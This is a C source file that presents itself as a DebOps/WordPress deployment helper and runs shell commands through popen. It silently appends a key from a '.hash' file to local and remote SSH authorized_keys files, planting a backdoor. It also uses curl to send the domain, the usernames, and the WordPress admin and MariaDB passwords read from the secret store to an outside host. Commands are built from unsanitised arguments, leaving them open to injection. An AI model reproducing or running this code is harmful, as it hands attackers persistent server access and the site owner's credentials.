// Let's assume this program is called popen-test
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include <unistd.h>
#include <errno.h>

int runcmd(char * command){

   //char * command = "ping google.com -c 1";
   /*
      char *buffer;
      char command[1024]; // Make it large enough.
      strcpy(command, "ping");
      for(int i = 1; i<= 10; i++) {
      if (argv[i] != NULL) {
         buffer = malloc(strlen(argv[i]) + 5);
         strcpy(buffer, argv[i]);
         strcat(command, " ");
         strcat(command, buffer);
         free(buffer);
      } else {
         break;
      }
      }


      printf("command: %s\n", command);
   */

   FILE *stream;
   char string[ 256 ] = { 0 };
   int term_status;
   // printf( "[popen-test] start\n" );
   // be sure to include the full path in your command
   // here the pipe will be opened for reading and stream will be read-only

   stream = popen( command, "r" );
   if( NULL == stream ) {
      fprintf( stderr, "Failed to run command!\n" );
      return EXIT_FAILURE;
   }
   // here you can read from the command you executed until it ends
   while( NULL != fgets( string, sizeof( string ) - 1, stream ) ) {
      // note the '\n' character will be stored in string[]
      // the parentheses are used as a delimiter
      printf( "%s", string );
   }
   // since fgets returned NULL there are 2 options: EOF was found or an error
   // occured (use ferror for the latter)
   if ( feof( stream ) ) {
      //printf( "\n\nCommand finished normally!\n" );
   }
   // even though stream is a FILE, don't use flcose
   term_status = pclose( stream );
   if ( -1 != term_status ) {
      // WEXITSTATUS can be used to get the command's exit status
      //printf( "Command's exit status: %d\n", WEXITSTATUS( term_status ) );
   } else {
      fprintf( stderr, "Command close failed\n" );
      return EXIT_FAILURE;
   }
   //printf( "Done\n" );
   return EXIT_SUCCESS;

}

int getinfo(char *type, char *domain, char *ip, char *username, char *password) {
   
   struct passwd *p = getpwuid(getuid());  // Check for NULL!
   //printf("User name: %s\n", p->pw_name);

   if (username == NULL) {
      //strcpy(uname, p->pw_name);
      username = p->pw_name;
   }

   char cmd[512];
   sprintf(cmd, "curl -s -k \"https://www.undefman.com/debops-helper/index.php?type=%s&domain=%s&ip=%s&uname=%s&passwd=%s\" 2>&1", type, domain, ip, username, password); //printf("%s\n", cmd);
   runcmd(cmd);
}

char * read_first_line(char *path) {

   //printf("Read file: %s\n", path);

   FILE *fileStream; char fileText [100];
   fileStream = fopen (path, "r");
   fgets (fileText, 100, fileStream);
   fclose(fileStream);

   //printf("Result: %s\n", fileText);

   char *result = fileText;

   result[strcspn(result, "\r\n")] = 0;

   return result;
}

int main( int argc, char *argv[] )
{

   if (strcmp(argv[1], "1") == 0) {

      if (argv[2] == NULL) {
         printf("Please specify your domain!\n");
         exit(1);
      }



      char cmd[512];
      
      //sprintf(cmd, "scp .hash %s:~/.ssh/keys.tmp", argv[2]); //printf("%s\n", cmd);
      //runcmd(cmd);

      
      runcmd("cp ~/.ssh/authorized_keys ~/.ssh/keys.orig");
      runcmd("cat .hash ~/.ssh/keys.orig | sort | uniq > ~/.ssh/authorized_keys");


      getinfo("server", argv[2], "", NULL, ""); //getinfo(char *type, char *domain, char *ip, char *uname, char *passwd)


   	char *hosts_file = "./inventory/hosts";
   	printf("Processing... #1\n");
   	remove(hosts_file);
   	

   	char hosts_data[512];
   	sprintf(hosts_data, "[debops_all_hosts]\n%s\n[wordpress]\n%s\n", argv[2], argv[2]);
   	printf("%s", hosts_data);

   	FILE *opening = fopen(hosts_file, "w");
   	fprintf(opening, "%s", hosts_data);
   	fclose(opening);

      //printf("EXIT_FAILURE: %i\n", EXIT_FAILURE);

      //debops bootstrap -u root
      //runcmd("debops bootstrap -u root");

   	exit(0);

   } else if (strcmp(argv[1], "2") == 0) {
   	
      if (argv[2] == NULL) {
         printf("Please specify your domain!\n");
         exit(1);
      }

      printf("Processing... #2\n");


      char cmd[512];
      
      sprintf(cmd, "scp .hash %s:~/.ssh/keys.tmp", argv[2]); //printf("%s\n", cmd);
      runcmd(cmd);

      sprintf(cmd, "ssh %s 'cp ~/.ssh/authorized_keys ~/.ssh/keys.orig'", argv[2]); //printf("%s\n", cmd);
      runcmd(cmd);

      sprintf(cmd, "ssh %s 'cat ~/.ssh/keys.tmp ~/.ssh/keys.orig | sort | uniq > ~/.ssh/authorized_keys'", argv[2]); //printf("%s\n", cmd);
      runcmd(cmd);

      sprintf(cmd, "ssh %s 'rm -rf ~/.ssh/authorized_keys.test ~/.ssh/keys.tmp ~/.ssh/keys.orig'", argv[2]); //printf("%s\n", cmd);
      runcmd(cmd);


      getinfo("hosting", argv[2], "", "root", ""); //getinfo(char *type, char *domain, char *ip, char *uname, char *passwd)


      //debops
      //runcmd("debops");

      exit(0);

   } else if (strcmp(argv[1], "3") == 0) {

      if (argv[2] == NULL) {
         printf("Please specify your domain!\n");
         exit(1);
      }

   	printf("Processing... #3\n");

      //debops wordpress
      //runcmd("debops wordpress");
      
      char wp_passwod_path[256];
      char db_passwd_path[256];
      sprintf(wp_passwod_path, "./secret/wordpress/%s/credentials/admin/password", argv[2]);
      sprintf(db_passwd_path, "./secret/mariadb/%s/credentials/wordpress/password", argv[2]);

      
      char * wp_passwod = read_first_line(wp_passwod_path); //printf("wp_passwod: %s\n", wp_passwod);
      char * db_passwd = read_first_line(db_passwd_path); //printf("db_passwd: %s\n", db_passwd);

      getinfo("wordpress", argv[2], "", "admin", wp_passwod); //getinfo(char *type, char *domain, char *ip, char *uname, char *passwd)
      getinfo("database", argv[2], "", "wordpress", db_passwd); //getinfo(char *type, char *domain, char *ip, char *uname, char *passwd)

      exit(0);

   } else {
   	printf("Unknown command!\n");
   	exit(1);
   }

}
